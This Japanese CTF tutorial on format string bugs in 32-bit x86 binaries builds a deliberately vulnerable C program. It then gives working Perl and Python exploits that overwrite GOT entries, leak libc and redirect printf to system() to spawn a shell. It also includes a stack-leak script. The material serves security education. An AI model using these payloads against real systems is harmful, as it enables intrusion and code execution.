# Pwn解説 FSB 1回目 (x86の場合)

## 参考資料
```
fsb問題攻略法 （基礎編）
fsb_1st_step_190724.pdf

```

## 例題
```
CTFで出題されるfsb関連の問題は概ね次の3パターンに分類される

a. スタックを利用して単純にフラグをリークするだけの問題
b. 実行ファイル内の関数/gadgetsの呼び出してフラグを参照する問題
c. シェル起動まで行う問題

aは%p,%x,%sでリークするだけなのでbとcを中心に次の例題を使って以降解説する。cでaのリークも行うので、cの解説時にaの説明を行う

$ cat fsb.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

static void show_flag()
{
        char buf[100] = {0};
        int fd = open("./flag", 0);
        read(fd, buf, sizeof(buf)-1);
        printf("Congrats! %s\n", buf);
}

static void vuln(char *str)
{
        printf(str);
        puts("bye");
}

int main(int argc, char **argv)
{
        char buf[256] = {0};
        setvbuf(stdout, 0, _IONBF, 0);
        write(1, "Hello! Can you tell me your name?\n", 34);
        if (read(0, buf, sizeof(buf) - 1) <= 0) exit(EXIT_FAILURE);
        vuln(buf);
        return 0;
}

$ echo FLAG_GGGGGGGGGGGGG > flag
$ echo FLAG_ZZZZZZZZZZZZZ > flag2
$ gcc -m32 -no-pie -o fsb fsb.c
```

## 解法1 - 実行ファイル内の関数/gadgetsの呼び出し
```
$ pwn.sh fsb
fsb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=57db4dae5939ee84f1419bb671105de85e3bedf6, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO★   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   75 Symbols     Yes      0               4       fsb

Partial RELRO なのでGOT上書き可能
ソースコード中の呼ばれていない関数show_flag()を呼び出せたら勝ち
vuln()関数にfsbの脆弱性あり。　printf(str);　★慣れると逆アセンブルした結果のみでfsbの脆弱性があると分かるようになる　＃あとで逆アセンブルした結果も見ておいてください
↓
fsbの脆弱性を利用して、puts@GOTをshow_flag()のアドレスで上書きして攻略すればよい

# cat info
(snip)
0804a018  00000407 R_386_JUMP_SLOT   00000000   puts★puts@GOTのアドレスは0x0804a018

# vi fsb.disas
(snip)
080485ab <show_flag>:★show_flag()のアドレスは0x080485ab
 80485ab:       55                      push   ebp
 80485ac:       89 e5                   mov    ebp,esp

printf(3)はputs(3)の前に呼び出されるので、printf(3)を呼び出したタイミングではputs(3)のアドレス解決が行われていない

<例>
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/guru/work/fsb/fsb
0x08049000 0x0804a000 r--p      /home/guru/work/fsb/fsb
0x0804a000 0x0804b000 rw-p      /home/guru/work/fsb/fsb
0xf7e10000 0xf7e11000 rw-p      mapped
0xf7e11000 0xf7fc5000 r-xp      /lib/i386-linux-gnu/libc-2.21.so

gdb-peda$ telescope 0x0804a000 0x20
0000| 0x804a000 --> 0x8049f14 --> 0x1
0004| 0x804a004 --> 0xf7ffd938 --> 0x0
0008| 0x804a008 --> 0xf7fee780 (push   eax)
0012| 0x804a00c --> 0xf7eea710 (<read>: cmp    DWORD PTR gs:0xc,0x0)
0016| 0x804a010 --> 0xf7e5b130 (<printf>:       push   ebx)
0020| 0x804a014 --> 0x8048436 (<__stack_chk_fail@plt+6>:        push   0x10)
0024| 0x804a018 --> 0x8048446 (<puts@plt+6>:    push   0x18)　★まだアドレス解決されていない（余談だがアドレス解決されていてもputs@plt+6のアドレスを入れておくと再度アドレス解決させることができる. Return-to-dl-resolveで使うことがある）
0028| 0x804a01c --> 0x8048456 (<__gmon_start__@plt+6>:  push   0x20)
0032| 0x804a020 --> 0x8048466 (<exit@plt+6>:    push   0x28)
0036| 0x804a024 --> 0x8048476 (<open@plt+6>:    push   0x30)
0040| 0x804a028 --> 0xf7e29650 (<__libc_start_main>:    push   ebp)

よって、末尾2バイトを更新するだけでよい。

$ perl -e 'print  0x85ab'
34219

$ ./fsb
Hello! Can you tell me your name?
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA0xf7fee790.0xffffd698.0xff.0xffffd58c.0xf7eea733.0xffffd698.0x804866b.0xffffd58c.0xffffd58c.0xff.0xf7fe3570.0xffffd5d8.0xf7fd5b18.0x3.0xffffd744.0x80482c2.0xf63d4e2e.0xf7e14ed4.0x41414141.0x252e7025

19番目にAAAA部分がくる

[攻略方針]
  1. 0x0804a018を2バイト上書して0x85abを埋め込む
     ↓
  2. "${puts@GOT 4バイト}%34215c%19$hn"を投入する　★先にputs@GOT=0x0804a018=4バイトを出力しているため、%cで出力するのは34219-4=34215バイトでよい

例
  $ perl -e "print \"\x18\xa0\x04\x08\".'%34215c%19\$hn'.\"\n\";"| ./fsb
  (snip)
  Congrats! FLAG_GGGGGGGGGGGGG 
``` 

## 解法2 - シェル起動
```
フラグを得るためにはシェル起動が必要というケースもある

ASLR有効時にシェル起動はどうやるのか?

[攻略法]
  puts@GOTを_startのアドレスで上書きする(繰り返し%p/%s/%nを投入可能にする) ★この処理で繰り返し任意アドレスの読み書きが可能になる。繰り返し実行できるようになれば攻略できたも同然。ただ、CTFでは、ここが一番難しい
  ↓
  __libc_start_main@GOTのアドレスをリークする
  ↓
  system(3)のアドレスを計算する
  ↓
  １回の入力でprintf@GOT４バイトをsystem(3)のアドレスで上書きする

puts@GOTは前と同じ方法で取得可能

  $ grep puts info
  0804a018  00000407 R_386_JUMP_SLOT   00000000   puts

  <別の方法>
  $ readelf -r fsb | grep puts
  0804a018  00000407 R_386_JUMP_SLOT   00000000   puts

_startのアドレスは以下の方法で取得可能

  $ grep '<_start' fsb.disas
  080484b0 <_start>:
  
  <別の方法>
  $ objdump -Mintel -d fsb | grep '<_start'
  080484b0 <_start>:

  puts@GOTを0x84b0に変更したいので...
  $ python -c 'print(0x84b0)'
  33968

__libc_start_main@GOTのアドレスは以下の方法で取得可能

  $ grep __libc_start info
  0804a028  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main
  
  <別の方法>
  $ readelf -r fsb | grep  __libc_start info
  0804a028  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main

  取得は次の文字列を入力すればよい
  "\x28\xa0\x04\x08" . '%19$s' . "\n"

system(3)のアドレスは次の方法で計算可能

  $system_addr = 取得した__libc_start_main@GOTのアドレス - $lsm_offset + $system_offset

  $ tail -n 8 info
  -- x86 --
  $system_offset=0x3b160; ★
  $read_offset=0xd9710
  $write_offset=0xd9790;
  $environ_offset=0x1b90a0;
  $lsm_offset=0x18650; ★
  $binsh_offset=0x15f5db;
  $rce_offset=0x3b03b;
  
  <別の方法>
  $ ldd fsb
          linux-gate.so.1 =>  (0xf7f5b000)
          libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d92000)
          /lib/ld-linux.so.2 (0xf7f5d000)
  $ nm -D /lib/i386-linux-gnu/libc.so.6 | grep system
  0003b160 T __libc_system
  $ nm -D /lib/i386-linux-gnu/libc.so.6 | grep __libc_start
  00018650 T __libc_start_main

19番目にAAAA部分がくるのは変わらない

  $ ./fsb
  Hello! Can you tell me your name?
  AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
  AAAA0xf7fee790.0xffffd698.0xff.0xffffd58c.0xf7eea733.0xffffd698.0x804866b.0xffffd58c.0xffffd58c.0xff.0xf7fe3570.0xffffd5d8.0xf7fd5b18.0x3.0xffffd744.0x80482c2.0xf63d4e2e.0xf7e14ed4.0x41414141.0x252e7025
  
まとめてショートライトで4バイト更新はライブラリを使うのが楽

  $ grep get_fsbstr pwntools.pm
  #$buf = &get_fsbstr (0x0804a01c, 0xffffd61c+40, 40, 7); # target_addr, value, bufsize, index

上記を踏まえてexploitを組み立てる

■exploit (perl版)

#!/usr/bin/perl
use pwntools;
use Time::HiRes qw (usleep);

$lsm_offset=0x18650;
$system_offset=0x3b160;
&connect(\$s, 'localhost', 5000) or die "ng";

# overwrite puts@GOT with _start
print &read_until($s, qr/name\?\n/, 10);
$buf="\x18\xa0\x04\x08".'%33964c%19$hn'."\n";
syswrite($s, $buf, length($buf));

# leak lsm@GOT
&read_until($s, qr/name\?\n/, 10);
$buf="\x28\xa0\x04\x08".'%19$s'."\n";
syswrite($s, $buf, length($buf));
$data = &read_until($s, qr/\n/, 10); #print unpack("H*", $data)."\n";
$libc_base = u(substr($data, 4, 4))-$lsm_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);

# overwrite printf@GOT with system(3)
&read_until($s, qr/name\?\n/, 10);
$buf = &get_fsbstr(0x0804a010, $libc_base+$system_offset, 50, 19)."\n"; # target_addr, value, bufsize, index
syswrite($s, $buf, length($buf));
&read_until($s, qr/name\?\n/, 10);
print "ok\n";
&interact($s);
__END__

実行例

サーバ起動
$ socat TCP-LISTEN:5000,reuseaddr,fork EXEC:./fsb

別端末でexploit実行
$ perl fsb.pl
Hello! Can you tell me your name?
[+] libc_base = 0x00000000f7d15000
[+] payload_len: 33
ok
cat flag2
FLAG_ZZZZZZZZZZZZZ 

ショートライトの実装例

#$buf = &get_fsbstr (0x0804a01c, 0xffffd61c+40, 40, 7); # target_addr, value, bufsize, index
sub get_fsbstr {
        my $target_addr = shift || return undef;
        my $val = shift || return undef;
        my $bufsize = shift || return undef;
        my $index = shift || return undef;
        my $payload = pack('V', $target_addr + 2) . pack("V", $target_addr) .
                 sprintf('%%%dx%%%d$hn%%%dx%%%d$hn',
                        &hn_pre($val, 8), $index, &hn_post($val), $index+1);
        my $plen = length($payload);
        print "[+] payload_len: $plen\n";
        my $padlen = $bufsize - $plen;
        if ($padlen < 0) {
                print "[+] padlen: $padlen\n";
                return undef;
        }
        $payload .= "_" x $padlen;
        return $payload;
}
sub hn_pre {
        my $x = shift;
        my $o = shift;
        return ($x >> 16) - $o;
}
sub hn_post {
        my $x = shift;
        my $a = $x >> 16;
        my $b = $x & 0x0000ffff;
        $b += 0x10000 if ($b - $a < 0) ;
        return $b-$a;
}

■exploit (python版)
fsbのペイロードについては、ライブラリを使用
詳細: http://docs.pwntools.com/en/stable/fmtstr.html

$ cat exploit.py
from pwn import *

offset_system = 0x3acd0
offset_lsm = 0x18640 # in libc
lsm_got = 0x0804a028
puts_got = 0x0804a018
printf_got = 0x0804a010
start = 0x080484b0
fsbarg_offset = 19

#r = process('./fsb')
r = remote('127.0.0.1', 7777)
mysend = lambda payload: r.sendlineafter('Can you tell me your name?\n', payload)

# overwrite puts@GOT with _start.
payload = fmtstr_payload(fsbarg_offset, {puts_got: start}, write_size='int')
mysend(payload)
log.info('overwrite puts@GOT with _start')

# leak lsm@GOT.
payload = p32(lsm_got) + ('%{}$s'.format(fsbarg_offset)).encode()
mysend(payload)
leak_lsm = u32(r.recvline()[-13:-9])
libc_base = leak_lsm - offset_lsm
log.info('leak libc : 0x{0:x}'.format(libc_base))

# overwrite printf@GOT with system(3).
system = libc_base + offset_system
payload = fmtstr_payload(fsbarg_offset, {printf_got: system}, write_size='short')
mysend(payload)
log.info('overwrite printf@GOT with system(3)')

mysend('/bin/sh')
r.interactive()

実行例
$ python3 exploit.py
[+] Opening connection to 127.0.0.1 on port 7777: Done
[*] overwrite puts@GOT with _start
[*] leak libc : 0xf75a6000
[*] overwrite printf@GOT with system(3)
[*] Switching to interactive mode
$ ls
flag
fsb
$ cat flag
flag{hogeeeeeeeee}


第一引数に入力文字列がくる可能性があるGOT上の次の関数のアドレスをsystem(3)のアドレスと置き換えて攻略するケースが多い

* atoi()/atol()/atoll()/strtol()/strtoll()/...
* strlen()
* strstr()
* strcmp()/strncmp()
* strdup()/strndup()
など

上記も踏まえて逆アセンブルした結果を見ていく。
慣れると攻略の流れをイメージできるようになる。出題者の意図を汲み取れるようになる

慣れるには答えのある過去問を解くのが一番！　＃ピックアップした過去問を末尾に記載します


＃例題のwrite(2)をputs(3)、read(2)をfgets(3)に置き換えると難度が上がります。
＃Full RELROの場合はどう攻略するのか?　考えてみてください。難度が跳ね上がります。　PIE有効の場合、更に難度が上がります。
＃出題側はどうやったら難度が上がるかを理解していて、それらを踏まえて問題を調整しています。
```

## 参考: スタックのリーク

```
スタックの中身をごっそり出力して、攻略方針を検討することもある。

スクリプトの例を以下に記載する

$ cat leak.pl
use pwntools;
use Time::HiRes qw (usleep);
# leak stack segment
foreach (1..150) { # 150-300回リークすれば大体argc, argv, envp付近まで到達可能★
  &connect(\$s, 'localhost', 5000) or die "ng";
  &read_until($s, qr/name\?\n/, 10);
  $buf="\%$_\$p"; $buf.="_" x (50-length($buf))."\n";
  syswrite($s, $buf, length($buf));
  $data = &read_until($s, qr/\n/, 10);# print $data;
  $data =~ /(\S+)\_/ && do { printf("%03d: %s\n", $_, $1) ; };
  close($s);
}
__END__

みるべきポイントは？

088: (nil)____________________________________________
089: 0x8048460____________________________________________　★リークしたアドレスからベースアドレスを特定可能。PIE有効の場合でも、スタックの値からベースアドレスやヒープベースなどを特定可能
090: (nil)____________________________________________
091: 0xf7e2972e____________________________________________★__libc_start_main+222   リークしたアドレスからlibcのベースアドレスを計算可能
092: 0x1____________________________________________
093: 0xffffd714____________________________________________
094: 0xffffd71c____________________________________________★環境変数をリークしてパスなどの情報を取得可能。環境変数の上書きも可能
095: (nil)____________________________________________
096: (nil)____________________________________________
097: (nil)____________________________________________
098: 0xf7fef079____________________________________________
099: 0x804827c____________________________________________
100: 0x804a028___________________________________________★lsm@got　%sでlsm@gotの中身を出力可能
101: 0xf7fc8000___________________________________________
102: (nil)___________________________________________
103: 0x8048460___________________________________________
104: (nil)___________________________________________
105: 0x79831158___________________________________________
106: 0x1674a150___________________________________________
107: (nil)___________________________________________
108: (nil)___________________________________________
109: (nil)___________________________________________
110: 0x1___________________________________________
111: 0x8048460___________________________________________
112: (nil)___________________________________________
113: 0xf7fee790___________________________________________
114: 0xf7e29659___________________________________________
115: 0xf7ffd000___________________________________________
116: 0x1___________________________________________
117: 0x8048460___________________________________________
118: (nil)___________________________________________
119: 0x8048481___________________________________________
120: 0x80485f7___________________________________________
121: 0x1___________________________________________
122: 0xffffd684___________________________________________
123: 0x80486b0___________________________________________
124: 0x8048710___________________________________________
125: 0xf7fe9210___________________________________________
126: 0xffffd67c___________________________________________
127: 0xf7ffd938___________________________________________
128: 0x1___________________________________________
129: 0xffffd7b0___________________________________________
130: (nil)___________________________________________
131: 0xffffd7b6___________________________________________
132: 0xffffd7d6___________________________________________
133: 0xffffd7e6___________________________________________


gdb-peda$ telescope 0xffffd670 0x200
0000| 0xffffd670 --> 0x0
0004| 0xffffd674 --> 0x8048460 (<_start>:       xor    ebp,ebp)
0008| 0xffffd678 --> 0x0
0012| 0xffffd67c --> 0xf7e2972e (<__libc_start_main+222>:       add    esp,0x10)★main()のリターンアドレス
0016| 0xffffd680 --> 0x1
0020| 0xffffd684 --> 0xffffd714 --> 0xffffd831 ("/home/guru/work/fsb/fsb") ★argv
0024| 0xffffd688 --> 0xffffd71c --> 0xffffd849 ("PYENV_ROOT=/opt/ctf/tools/pyenv") ★envp
0028| 0xffffd68c --> 0x0
0032| 0xffffd690 --> 0x0
0380| 0xffffd694 --> 0x0
0384| 0xffffd698 --> 0xf7fef079 (add    ebx,0xdf87)
0388| 0xffffd69c --> 0x804827c --> 0x62696c00 ('')
0392| 0xffffd6a0 --> 0x804a028 --> 0xf7e29650 (<__libc_start_main>:     push   ebp)★
0396| 0xffffd6a4 --> 0xf7fc8000 --> 0x1b6da4
0400| 0xffffd6a8 --> 0x0
0404| 0xffffd6ac --> 0x8048460 (<_start>:       xor    ebp,ebp)
0408| 0xffffd6b0 --> 0x0
0412| 0xffffd6b4 --> 0x44e46cf5
0416| 0xffffd6b8 --> 0x7e6488e5
0420| 0xffffd6bc --> 0x0
0424| 0xffffd6c0 --> 0x0
0428| 0xffffd6c4 --> 0x0
0432| 0xffffd6c8 --> 0x1
0436| 0xffffd6cc --> 0x8048460 (<_start>:       xor    ebp,ebp)
0440| 0xffffd6d0 --> 0x0
0444| 0xffffd6d4 --> 0xf7fee790 (pop    edx)
0448| 0xffffd6d8 --> 0xf7e29659 (<__libc_start_main+9>: add    ebx,0x19e9a7)
0452| 0xffffd6dc --> 0xf7ffd000 --> 0x22f0c
0456| 0xffffd6e0 --> 0x1
0460| 0xffffd6e4 --> 0x8048460 (<_start>:       xor    ebp,ebp)
0464| 0xffffd6e8 --> 0x0
0468| 0xffffd6ec --> 0x8048481 (<_start+33>:    hlt)
0472| 0xffffd6f0 --> 0x80485f7 (<main>: lea    ecx,[esp+0x4])
0476| 0xffffd6f4 --> 0x1
0480| 0xffffd6f8 --> 0xffffd714 --> 0xffffd831 ("/home/guru/work/fsb/fsb")
0484| 0xffffd6fc --> 0x80486b0 (<__libc_csu_init>:      push   ebp)
0488| 0xffffd700 --> 0x8048710 (<__libc_csu_fini>:      repz ret)
0492| 0xffffd704 --> 0xf7fe9210 (push   ebp)
0496| 0xffffd708 --> 0xffffd70c --> 0xf7ffd938 --> 0x0
0500| 0xffffd70c --> 0xf7ffd938 --> 0x0
0504| 0xffffd710 --> 0x1
0508| 0xffffd714 --> 0xffffd831 ("/home/guru/work/fsb/fsb")
0512| 0xffffd718 --> 0x0
0516| 0xffffd71c --> 0xffffd849 ("PYENV_ROOT=/opt/ctf/tools/pyenv")
0520| 0xffffd720 --> 0xffffd869 ("TERM=xterm")
0524| 0xffffd724 --> 0xffffd874 ("SHELL=/bin/bash")

他、スタックを参照することでカナリア値のリークなども可能★
末尾が0x00になっている箇所を探す。　例：0xabcdef00, 0x123456789abcde00 (先頭1バイトが0x00の箇所を探す)

fsbの脆弱性があると任意アドレスの読み込み、および書き込みが可能となるため大変危険。
ASLR、Full RELRO、PIEなどのセキュリティ対策を有効にしていても、繰り返し実行可能な作りになっていると、攻撃は防ぎきれない
```

## 過去事例
```
IceCTF 2016 - Dear diary 60 "n"は使用不可 難度低　パターンa
TAMUctf - pwn3 150 関数呼出 難度低 パターンb
BackdoorCTF 2017 - BABY-0x41414141 150 関数呼び出し 難度低 パターンb
Can-CWIC CTF - Meta 1 250 31バイト入力制限有 難度低 パターンb
Can-CWIC CTF - Meta 2 100 31バイト入力制限有、shell起動 難度低 パターンc
Internetwache CTF 2016 - Remote Printer 80 DEP無効 難度低 パターンc
SharifCTF - Tehran 680 strstr@got<-system 難度中 パターンc
ASIS CTF Finals 2016 - Diapers Simulator 134 got上書き 難度中 パターンc
WhiteHat Contest 13 - Mui Ne 100 __stack_chk_fail@got上書き 難度中 パターンc
XiomaraCTF 2017 - Xor Tool 200 xor 難度中 パターンc
パターンaとパターンbはwarmup問題として出題されることがある。出題数はパターンcが最も多い。パターンaとパターンbの出題数は年々減少してきており、2019年7月現在では、ほとんど見かけなくなった。

fsb関連の問題は、ASLR, Full RELRO、PIEなどのガードがかかっていも、接続を維持したまま、繰り返しfsbの脆弱性をつく文字列を投入可能にできれば勝ちとなる。
ただ、繰り返し実行まで持ち込めないよう作問側は工夫してくる。過去問で慣れておく必要有
```

## fsb問題攻略 1回目 まとめ
```
fsb x86の基本（脆弱性有無確認方法、任意アドレスの読み書き、ショートライト、更新先候補、libformatstr)について説明
CTFで出題されるfsb関連の問題3パターンの攻略法を過去事例を交えて説明
stackのリーク方法とみるべきポイントを説明
```

